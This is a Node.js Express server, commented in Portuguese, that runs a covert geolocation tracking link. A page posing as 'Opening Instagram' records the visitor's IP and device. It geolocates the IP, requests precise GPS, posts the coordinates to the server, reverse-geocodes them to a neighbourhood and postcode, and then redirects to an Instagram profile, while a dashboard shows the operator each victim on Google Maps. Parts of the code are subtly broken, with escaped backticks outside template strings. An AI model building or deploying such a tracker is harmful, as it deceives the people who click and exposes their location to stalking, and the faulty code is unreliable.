const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const clicks = [];
const gpsData = [];

// Função para obter IP real do usuário
function getRealIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress;
}

// ROTA 1: Dashboard
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>📊 Dashboard GPS</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 1rem;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          background: white;
          padding: 2rem;
          border-radius: 15px;
          margin-bottom: 2rem;
          text-align: center;
          box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .tracking-link {
          background: #667eea;
          color: white;
          padding: 1rem 2rem;
          border-radius: 10px;
          text-decoration: none;
          display: inline-block;
          margin-top: 1rem;
          font-weight: bold;
        }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 1rem;
          margin-bottom: 2rem;
        }
        .stat-card {
          background: white;
          padding: 1.5rem;
          border-radius: 10px;
          text-align: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .stat-card h3 { color: #667eea; font-size: 2.5rem; margin-bottom: 0.5rem; }
        .stat-card p { color: #666; font-size: 0.9rem; }
        .clicks-container { display: grid; gap: 1rem; }
        .click-card {
          background: white;
          padding: 1.5rem;
          border-radius: 10px;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .click-card.with-gps { border-left: 5px solid #10b981; }
        .click-card.with-ip { border-left: 5px solid #f59e0b; }
        .click-card.no-location { border-left: 5px solid #ef4444; }
        .maps-link {
          background: #10b981;
          color: white;
          padding: 0.8rem 1.5rem;
          border-radius: 8px;
          text-decoration: none;
          display: inline-block;
          margin-top: 1rem;
          font-weight: bold;
        }
        .reload-btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 1rem 2rem;
          border-radius: 10px;
          cursor: pointer;
          margin-bottom: 1rem;
          font-weight: bold;
          box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        .reload-btn:hover { background: #5568d3; }
        .precision-badge {
          display: inline-block;
          padding: 0.4rem 1rem;
          border-radius: 5px;
          font-size: 0.85rem;
          font-weight: bold;
          margin-top: 0.5rem;
        }
        .precision-high { background: #10b981; color: white; }
        .precision-medium { background: #f59e0b; color: white; }
        .info-row { margin: 0.5rem 0; padding: 0.5rem 0; }
        .info-row strong { color: #333; }
        .location-section {
          margin-top: 1rem;
          padding-top: 1rem;
          border-top: 2px solid #e5e7eb;
        }
        .location-title {
          font-weight: bold;
          font-size: 1.1rem;
          margin-bottom: 0.8rem;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📊 Dashboard de Rastreamento GPS</h1>
          <p style="color: #666; margin-top: 0.5rem;">Rastreamento em tempo real de localização</p>
          <a href="/track" class="tracking-link">🔗 Abrir Link de Rastreamento</a>
        </div>
        <button class="reload-btn" onclick="loadData()">🔄 Atualizar Dados</button>
        <div id="stats" class="stats"></div>
        <div id="clicks" class="clicks-container"></div>
      </div>
      <script>
        async function loadData() {
          try {
            const res = await fetch('/api/stats');
            const data = await res.json();
            
            document.getElementById('stats').innerHTML = \`
              <div class="stat-card">
                <h3>\${data.totalClicks}</h3>
                <p>Total de Cliques</p>
              </div>
              <div class="stat-card">
                <h3>\${data.clicksComGPS || 0}</h3>
                <p>Com GPS Exato</p>
              </div>
              <div class="stat-card">
                <h3>\${data.clicksComIP || 0}</h3>
                <p>Com Localização IP</p>
              </div>
            \`;

            const clicksHtml = data.clicks.map(c => {
              const hasGPS = c.gps && c.gps.lat;
              const hasIPLocation = c.ipLocation && c.ipLocation.cidade;
              const loc = c.location || c.ipLocation;
              
              let cardClass = 'no-location';
              if (hasGPS) cardClass = 'with-gps';
              else if (hasIPLocation) cardClass = 'with-ip';
              
              return \`
                <div class="click-card \${cardClass}">
                  <div class="info-row"><strong>⏰ Data/Hora:</strong> \${new Date(c.timestamp).toLocaleString('pt-BR')}</div>
                  <div class="info-row"><strong>🌐 IP:</strong> \${c.ip}</div>
                  <div class="info-row"><strong>📱 Dispositivo:</strong> \${c.device}</div>
                  <div class="info-row"><strong>🔍 User Agent:</strong> \${c.userAgent?.substring(0, 80)}...</div>
                  
                  \${hasGPS ? \`
                    <div class="location-section" style="border-top-color: #10b981;">
                      <div class="location-title" style="color: #10b981;">📍 LOCALIZAÇÃO GPS PRECISA</div>
                      <span class="precision-badge precision-high">✓ Alta Precisão</span>
                      \${loc ? \`
                        <div class="info-row"><strong>🏙️ Cidade:</strong> \${loc.cidade}</div>
                        <div class="info-row"><strong>🗺️ Estado:</strong> \${loc.estado}</div>
                        <div class="info-row"><strong>🏘️ Bairro:</strong> \${loc.bairro}</div>
                        <div class="info-row"><strong>📮 CEP:</strong> \${loc.cep}</div>
                        <div class="info-row"><strong>🌎 País:</strong> \${loc.pais}</div>
                      \` : ''}
                      <div class="info-row"><strong>🗺️ Coordenadas:</strong> \${c.gps.lat}, \${c.gps.lng}</div>
                      <div class="info-row"><strong>🎯 Precisão:</strong> ±\${Math.round(c.gps.accuracy)}m</div>
                      <a href="https://www.google.com/maps?q=\${c.gps.lat},\${c.gps.lng}" 
                         target="_blank" class="maps-link">📍 Abrir no Google Maps</a>
                    </div>
                  \` : hasIPLocation ? \`
                    <div class="location-section" style="border-top-color: #f59e0b;">
                      <div class="location-title" style="color: #f59e0b;">📍 LOCALIZAÇÃO POR IP</div>
                      <span class="precision-badge precision-medium">⚠ Precisão Aproximada</span>
                      <div class="info-row"><strong>🏙️ Cidade:</strong> \${c.ipLocation.cidade}</div>
                      <div class="info-row"><strong>🗺️ Estado:</strong> \${c.ipLocation.estado}</div>
                      <div class="info-row"><strong>🌎 País:</strong> \${c.ipLocation.pais}</div>
                      \${c.ipLocation.lat && c.ipLocation.lng ? \`
                        <div class="info-row"><strong>🗺️ Coordenadas (aprox):</strong> \${c.ipLocation.lat}, \${c.ipLocation.lng}</div>
                        <a href="https://www.google.com/maps?q=\${c.ipLocation.lat},\${c.ipLocation.lng}" 
                           target="_blank" class="maps-link" style="background: #f59e0b;">📍 Ver Localização Aproximada</a>
                      \` : ''}
                      <div style="color: #6b7280; font-size: 0.9rem; margin-top: 1rem; padding: 0.8rem; background: #fef3c7; border-radius: 5px;">
                        ℹ️ GPS não autorizado pelo usuário - localização baseada no endereço IP
                      </div>
                    </div>
                  \` : \`
                    <div class="location-section" style="border-top-color: #ef4444;">
                      <div class="location-title" style="color: #ef4444;">⚠️ SEM LOCALIZAÇÃO</div>
                      <div style="color: #6b7280; font-size: 0.9rem;">
                        Não foi possível obter localização deste dispositivo
                      </div>
                    </div>
                  \`}
                </div>
              \`;
            }).join('');
            
            document.getElementById('clicks').innerHTML = clicksHtml || '<div style="text-align: center; color: white; padding: 2rem;">📭 Nenhum clique registrado ainda</div>';
          } catch (error) {
            console.error('Erro ao carregar dados:', error);
          }
        }
        
        loadData();
        setInterval(loadData, 5000); // Atualiza a cada 5 segundos
      </script>
    </body>
    </html>
  `);
});

// ROTA 2: Rastreamento
app.get('/track', async (req, res) => {
  const realIP = getRealIP(req);
  
  const clickData = {
    id: clicks.length + 1,
    ip: realIP,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString(),
    referer: req.headers.referer || 'Acesso Direto',
    device: req.headers['user-agent'].includes('Mobile') ? 'Mobile' : 'Desktop',
    ipLocation: null,
    gps: null,
    location: null
  };
  
  clicks.push(clickData);
  console.log('\n🎯 NOVO CLIQUE REGISTRADO');
  console.log('📍 ID:', clickData.id);
  console.log('🌐 IP Real:', realIP);
  console.log('📱 Device:', clickData.device);
  
  // Tenta capturar localização por IP em paralelo
  (async () => {
    try {
      console.log('🔍 Buscando localização do IP:', realIP);
      
      // Tenta múltiplas APIs para garantir sucesso
      let ipData = null;
      
      // API 1: ipapi.co (mais precisa)
      try {
        const response1 = await fetch(`https://ipapi.co/${realIP}/json/`);
        ipData = await response1.json();
        if (ipData && ipData.city) {
          console.log('✅ Localização obtida via ipapi.co');
        }
      } catch (e) {
        console.log('⚠️ ipapi.co falhou, tentando alternativa...');
      }
      
      // API 2: ip-api.com (fallback)
      if (!ipData || !ipData.city) {
        try {
          const response2 = await fetch(`http://ip-api.com/json/${realIP}?lang=pt&fields=status,country,countryCode,region,regionName,city,lat,lon,timezone`);
          const data2 = await response2.json();
          if (data2.status === 'success') {
            ipData = {
              city: data2.city,
              region: data2.regionName,
              country_name: data2.country,
              latitude: data2.lat,
              longitude: data2.lon
            };
            console.log('✅ Localização obtida via ip-api.com');
          }
        } catch (e) {
          console.log('⚠️ ip-api.com também falhou');
        }
      }
      
      if (ipData && ipData.city) {
        const click = clicks.find(c => c.id === clickData.id);
        if (click) {
          click.ipLocation = {
            cidade: ipData.city || 'N/A',
            estado: ipData.region || ipData.regionName || 'N/A',
            pais: ipData.country_name || ipData.country || 'N/A',
            lat: ipData.latitude || ipData.lat,
            lng: ipData.longitude || ipData.lon
          };
          console.log(`🏙️ Localização IP: ${click.ipLocation.cidade}, ${click.ipLocation.estado}, ${click.ipLocation.pais}`);
        }
      } else {
        console.log('❌ Não foi possível obter localização por IP');
      }
    } catch (error) {
      console.error('❌ Erro ao buscar localização IP:', error.message);
    }
  })();
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Carregando...</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
          color: white;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
          text-align: center;
          padding: 2rem;
        }
        .container {
          max-width: 400px;
          width: 100%;
        }
        .spinner {
          width: 60px;
          height: 60px;
          border: 6px solid rgba(255,255,255,0.3);
          border-top-color: white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { 
          font-size: 2rem; 
          margin-bottom: 1rem;
          text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        #status { 
          font-size: 1.1rem; 
          opacity: 0.9;
          margin-top: 1rem;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="spinner"></div>
        <h1>📷 Abrindo Instagram</h1>
        <p id="status">Preparando redirecionamento...</p>
      </div>
      <script>
        const clickId = ${clickData.id};
        let redirected = false;
        let gpsAttempted = false;
        
        console.log('🎯 Click ID:', clickId);
        console.log('📱 User Agent:', navigator.userAgent);
        console.log('🌐 Platform:', navigator.platform);
        
        function redirectToInstagram() {
          if (redirected) return;
          redirected = true;
          console.log('🔄 Redirecionando para Instagram...');
          document.getElementById('status').textContent = 'Redirecionando...';
          window.location.href = 'https://www.instagram.com/andre.osantos12/';
        }
        
        function attemptGPSCapture() {
          if (gpsAttempted) return;
          gpsAttempted = true;
          
          console.log('📍 Verificando disponibilidade de GPS...');
          
          if (!navigator.geolocation) {
            console.log('❌ Geolocalização não disponível neste navegador');
            setTimeout(redirectToInstagram, 1000);
            return;
          }
          
          console.log('✅ API de Geolocalização disponível');
          document.getElementById('status').textContent = 'Obtendo sua localização...';
          
          const timeoutId = setTimeout(() => {
            console.log('⏱️ Timeout de GPS atingido, redirecionando...');
            redirectToInstagram();
          }, 8000);
          
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              clearTimeout(timeoutId);
              
              const coords = position.coords;
              console.log('✅ GPS CAPTURADO COM SUCESSO!');
              console.log('📍 Latitude:', coords.latitude);
              console.log('📍 Longitude:', coords.longitude);
              console.log('🎯 Precisão:', coords.accuracy, 'metros');
              
              const gpsData = {
                clickId: clickId,
                latitude: coords.latitude,
                longitude: coords.longitude,
                accuracy: coords.accuracy,
                altitude: coords.altitude,
                altitudeAccuracy: coords.altitudeAccuracy,
                heading: coords.heading,
                speed: coords.speed,
                timestamp: new Date().toISOString()
              };
              
              try {
                console.log('📤 Enviando dados GPS para servidor...');
                
                const response = await fetch('/api/save-gps', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(gpsData)
                });
                
                const result = await response.json();
                
                if (result.success) {
                  console.log('✅ GPS enviado com sucesso!');
                  console.log('📊 Resposta:', result);
                } else {
                  console.error('⚠️ Servidor retornou erro:', result);
                }
              } catch (error) {
                console.error('❌ Erro ao enviar GPS:', error);
              }
              
              setTimeout(redirectToInstagram, 1500);
            },
            (error) => {
              clearTimeout(timeoutId);
              
              console.error('❌ ERRO AO CAPTURAR GPS');
              console.error('Código:', error.code);
              console.error('Mensagem:', error.message);
              
              const errorMessages = {
                1: 'Permissão negada pelo usuário',
                2: 'Posição indisponível',
                3: 'Timeout ao obter localização'
              };
              
              console.log('ℹ️', errorMessages[error.code] || 'Erro desconhecido');
              console.log('ℹ️ Usando apenas localização por IP');
              
              setTimeout(redirectToInstagram, 1500);
            },
            {
              enableHighAccuracy: true,
              timeout: 7000,
              maximumAge: 0
            }
          );
        }
        
        // Inicia captura de GPS após um pequeno delay
        setTimeout(attemptGPSCapture, 500);
      </script>
    </body>
    </html>
  `);
});

// ROTA 3: Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  console.log('\n📥 === RECEBENDO DADOS GPS ===');
  console.log('📦 Body completo:', JSON.stringify(req.body, null, 2));
  
  try {
    const gps = req.body;
    
    if (!gps || !gps.latitude || !gps.longitude) {
      console.error('❌ Dados de GPS inválidos ou incompletos');
      return res.status(400).json({ success: false, error: 'Dados inválidos' });
    }
    
    console.log('✅ Dados de GPS válidos recebidos');
    console.log(`📍 Coordenadas: ${gps.latitude}, ${gps.longitude}`);
    console.log(`🎯 Precisão: ±${gps.accuracy}m`);
    
    gpsData.push(gps);
    
    const click = clicks.find(c => c.id === gps.clickId);
    
    if (!click) {
      console.error(`❌ Click ID ${gps.clickId} não encontrado`);
      return res.status(404).json({ success: false, error: 'Click não encontrado' });
    }
    
    console.log(`✅ Click ID ${gps.clickId} encontrado, associando GPS...`);
    
    click.gps = {
      lat: gps.latitude,
      lng: gps.longitude,
      accuracy: gps.accuracy,
      altitude: gps.altitude,
      speed: gps.speed,
      heading: gps.heading
    };
    
    console.log('🗺️ Link Google Maps:', \`https://www.google.com/maps?q=\${gps.latitude},\${gps.longitude}\`);
    
    // Busca endereço detalhado usando as coordenadas GPS
    console.log('🔍 Buscando endereço completo...');
    
    try {
      const geocodeResponse = await fetch(
        \`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=\${gps.latitude}&longitude=\${gps.longitude}&localityLanguage=pt\`
      );
      
      const geocodeData = await geocodeResponse.json();
      console.log('📡 Resposta da API de geocodificação:', JSON.stringify(geocodeData, null, 2));
      
      if (geocodeData) {
        click.location = {
          cidade: geocodeData.city || geocodeData.locality || 'N/A',
          estado: geocodeData.principalSubdivision || geocodeData.principalSubdivisionCode || 'N/A',
          pais: geocodeData.countryName || 'Brasil',
          bairro: geocodeData.localityInfo?.administrative?.[0]?.name || 
                  geocodeData.localityInfo?.administrative?.[1]?.name || 
                  geocodeData.locality || 'N/A',
          cep: geocodeData.postcode || 'N/A',
          endereco: geocodeData.localityInfo?.informative?.[0]?.name || 'N/A'
        };
        
        console.log('✅ ENDEREÇO COMPLETO OBTIDO:');
        console.log('🏙️ Cidade:', click.location.cidade);
        console.log('🗺️ Estado:', click.location.estado);
        console.log('🏘️ Bairro:', click.location.bairro);
        console.log('📮 CEP:', click.location.cep);
        console.log('🌎 País:', click.location.pais);
      }
    } catch (error) {
      console.error('❌ Erro ao buscar endereço:', error.message);
    }
    
    console.log('✅ === GPS SALVO COM SUCESSO ===\n');
    
    res.json({ 
      success: true, 
      message: 'GPS salvo com sucesso',
      data: {
        clickId: gps.clickId,
        coordinates: \`\${gps.latitude}, \${gps.longitude}\`,
        accuracy: \`±\${gps.accuracy}m\`,
        location: click.location
      }
    });
    
  } catch (error) {
    console.error('❌ ERRO CRÍTICO:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ROTA 4: Stats
app.get('/api/stats', (req, res) => {
  res.json({
    totalClicks: clicks.length,
    clicksComGPS: clicks.filter(c => c.gps && c.gps.lat).length,
    clicksComIP: clicks.filter(c => !c.gps && c.ipLocation && c.ipLocation.cidade).length,
    clicks: clicks.reverse() // Mais recentes primeiro
  });
});

// Middleware de erro
app.use((err, req, res, next) => {
  console.error('❌ Erro no servidor:', err);
  res.status(500).json({ error: 'Erro interno do servidor' });
});

// Inicia servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log('🚀 ========================================');
  console.log(\`🚀 Servidor iniciado na porta \${PORT}\`);
  console.log('🚀 ========================================');
  console.log('📊 Dashboard:', \`http://localhost:\${PORT}\`);
  console.log('📍 Tracking:', \`http://localhost:\${PORT}/track\`);
  console.log('🚀 ========================================\n');
});
